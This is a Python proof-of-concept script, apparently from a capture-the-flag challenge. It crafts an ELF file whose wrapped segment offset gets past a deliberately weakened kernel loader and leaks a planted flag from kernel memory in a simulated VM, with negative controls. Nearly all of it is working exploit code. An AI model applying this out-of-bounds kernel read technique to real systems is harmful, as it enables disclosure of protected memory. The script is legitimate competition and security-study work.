#!/usr/bin/env python3
# Stage 3 proof: build the crafted ELF, replay the real loader's checks on a
# synthetic kernel-memory model, then execute the ring-3 payload in a small
# i386 VM. Includes a negative control (no wrap => nothing must leak).
import struct, sys

BASE, USER_LO, USER_HI = 0xC0000000, 0xC0000000, 0xC8000000
WINLEN, MAX_UPAGES, MAX_ELF = 0x200000, 1024, 256 * 1024
ARENA, RAM_TOP, HEAP_SIZE = 0x00176000, 128 * 1024 * 1024, 8 * 1024 * 1024
EHSIZE, PHENT = 52, 32
TRACE = set()          # add an esi value here to dump the scan mid-run
FLAG3 = b"cdctf{TH1S_1S_THE_L0CAL_STAND_IN_PLZ}\n"

code = open("payload.bin", "rb").read()


def build_elf(p_offset, winlen=WINLEN):
    ident = b"\x7fELF" + bytes([1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0])
    entry = BASE + ((-p_offset & 0xFFFFFFFF) + EHSIZE + PHENT)
    rest = struct.pack("<HHIIIIIHHHHHH", 2, 3, 1, entry, EHSIZE, 0, 0,
                       EHSIZE, PHENT, 1, 0, 0, 0)
    phdr = struct.pack("<IIIIIIII", 1, p_offset, BASE, 0, winlen, winlen, 7, 0x1000)
    elf = ident + rest + phdr + code
    assert len(ident) == 16 and len(rest) == 36 and len(elf) == EHSIZE + PHENT + len(code)
    return elf, entry


def load_segment_checks(p_vaddr, p_offset, p_filesz, p_memsz, read_from, bufsz):
    """Transcribed from src/usermode.c:114-147 (CHALLENGE build)."""
    errs = []
    va_start = p_vaddr & ~0xFFF
    va_end = (p_vaddr + p_memsz + 0xFFF) & ~0xFFF
    if va_end <= va_start: errs.append("vaddr wrapped")
    if p_vaddr < USER_LO:  errs.append("vaddr < USER_LO")
    if va_end > USER_HI:   errs.append("vaddr > USER_HI")
    pages = (va_end - va_start) // 4096
    if pages + 4 > MAX_UPAGES: errs.append(f"page cap: {pages}+4 stack > {MAX_UPAGES}")
    # CHALLENGE=1 deliberately skips the two p_offset bounds checks that
    # NO_CHALLENGE applies (p_offset > bufsz / p_filesz > bufsz - p_offset)
    for probe in (read_from, read_from + p_filesz - 1):
        if not (0x1000 <= probe < RAM_TOP): errs.append(f"unmapped read {probe:#x}")
    return errs, va_start, va_end, pages


def run_vm(img, entry, label):
    UM = bytearray(WINLEN)
    UM[:min(WINLEN, len(img))] = img[:WINLEN]
    regs = dict(eax=0, ebx=0, ecx=0, edx=0, esi=0, edi=0, esp=0, _cf=0, _zf=0)
    out, eip, steps = b"", entry - BASE, 0
    M = 0xFFFFFFFF
    def g8(a): return UM[a]
    def rd(a): return struct.unpack("<I", UM[a - BASE:a - BASE + 4])[0]
    def wr(a, v): UM[a - BASE:a - BASE + 4] = struct.pack("<I", v & M)
    def rel(o): return o - 256 if o >= 128 else o
    while steps < 20_000_000:
        steps += 1
        op = g8(eip)
        if op == 0xC7 and g8(eip + 1) == 0x05:
            wr(struct.unpack("<I", UM[eip + 2:eip + 6])[0],
               struct.unpack("<I", UM[eip + 6:eip + 10])[0]); eip += 10
        elif op == 0x31:                      # xor r,r  (f6=esi c0=eax db=ebx)
            regs[{0xf6: "esi", 0xc0: "eax", 0xdb: "ebx"}[g8(eip + 1)]] = 0; eip += 2
        elif op == 0x81 and g8(eip + 1) == 0xFE:
            r = struct.unpack("<I", UM[eip + 2:eip + 6])[0]
            regs["_cf"], regs["_zf"] = regs["esi"] < r, regs["esi"] == r; eip += 6
        elif op == 0x73:
            eip += 2 + (rel(g8(eip + 1)) if not regs["_cf"] else 0)
        elif op == 0x8B and g8(eip + 1) == 0x86:
            d = struct.unpack("<i", UM[eip + 2:eip + 6])[0]
            regs["eax"] = rd((regs["esi"] + d) & M); eip += 6
            if regs["esi"] in TRACE:
                print(f"    TRACE esi={regs['esi']:#x} -> eax={regs['eax']:#x} d={d:#x}")
        elif op == 0x3D:
            r = struct.unpack("<I", UM[eip + 1:eip + 5])[0]
            regs["_zf"] = regs["eax"] == r; eip += 5
        elif op == 0x75:
            eip += 2 + (rel(g8(eip + 1)) if not regs["_zf"] else 0)
        elif 0xB8 <= op <= 0xBF:
            regs[["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"][op - 0xB8]] = \
                struct.unpack("<I", UM[eip + 1:eip + 5])[0]; eip += 5
        elif op == 0x01 and g8(eip + 1) == 0xF1: regs["ecx"] = (regs["ecx"] + regs["esi"]) & M; eip += 2
        elif op == 0x83 and g8(eip + 1) == 0xC6: regs["esi"] = (regs["esi"] + g8(eip + 2)) & M; eip += 3
        elif op == 0xEB: eip = (eip + 2 + rel(g8(eip + 1))) & M
        elif op == 0xCD and g8(eip + 1) == 0x80:
            if regs["eax"] == 1:
                ptr, ln = regs["ecx"], regs["edx"]
                assert USER_LO <= ptr and ptr + ln <= USER_HI, "user_ok() would reject this"
                out += UM[ptr - BASE:ptr - BASE + ln]; regs["eax"] = ln
            elif regs["eax"] == 0:
                print(f"  [{label}] SYS_EXIT({regs['ebx']}) after {steps} steps"); return out
            eip += 2
        else:
            raise SystemExit(f"VM: unimplemented opcode {op:#02x} at eip={eip:#x}")
    raise SystemExit("VM: step limit, payload did not terminate")


def scenario(title, p_offset, buf_list, plant_flag=True):
    found = []
    print(f"\n=== {title}: p_offset={p_offset:#010x} ===")
    elf, entry = build_elf(p_offset)
    A = ARENA + 0x0C      # dmesg: stage3 flag pinned at 0x17600c
    for buf in buf_list:
        kmem = bytearray(b"\x00" * (ARENA + 0x400000))
        if plant_flag:
            kmem[A:A + len(FLAG3)] = FLAG3
        back = (-p_offset) & 0xFFFFFFFF
        read_from = (buf + p_offset) & 0xFFFFFFFF
        kmem[buf:buf + len(elf)] = elf                       # fat_read() into kmalloc buf
        errs, va_s, va_e, pages = load_segment_checks(BASE, p_offset, WINLEN, WINLEN,
                                                      read_from, len(elf))
        status = "PASS checks" if not errs else "REJECTED " + ",".join(errs)
        if errs:
            print(f"  buf={buf:#09x} {status}"); continue
        img = bytes(kmem[read_from:read_from + WINLEN])
        off = A - read_from
        out = run_vm(img, entry, f"buf={buf:#09x}")
        hits = [h for h in out.split(b"\n") if h.startswith(b"cdctf{")]
        print(f"  buf={buf:#09x} {status} pages={pages} flag_image_off={off:#x} "
              f"({'in window' if 0 <= off < WINLEN else 'OUTSIDE'}) hits={len(hits)} {hits[:1]}")
        found += hits
    return found


# A. the real plan: wrap 1 MB below the file buffer
hits = scenario("WRAP -1MB", 0xFFF00000, [ARENA + 0x4C, ARENA + 0x8C, ARENA + 0x1000, ARENA + 0x9000, ARENA + 0x40000])
assert hits, "stage-3 leak did not reproduce"
# B. negative control 1: same payload, no wrap -> flag sits below the window
n = scenario("NO WRAP (negative control)", 0x00000000, [ARENA + 0x4C], plant_flag=True)
assert not n, "negative control leaked, so the test proves nothing"
# C. negative control 2: wrap, but no flag planted in kernel memory
m = scenario("WRAP, flag absent (negative control)", 0xFFF00000, [ARENA + 0x4C], plant_flag=False)
assert not m, "false positive: leaked a flag that was never planted"

elf, entry = build_elf(0xFFF00000)
open("leak.elf", "wb").write(elf)
lines = ["".join(f"{c:02x}" for c in elf[i:i + 16]) for i in range(0, len(elf), 16)]
open("leak.hex.txt", "w").write("\n".join(lines) + "\n")
print(f"\nelf={len(elf)} bytes, entry={entry:#x}, hex chars={2 * len(elf)}, "
      f"lines={len(lines)} (16 B each)")
print("ALL SCENARIOS OK")
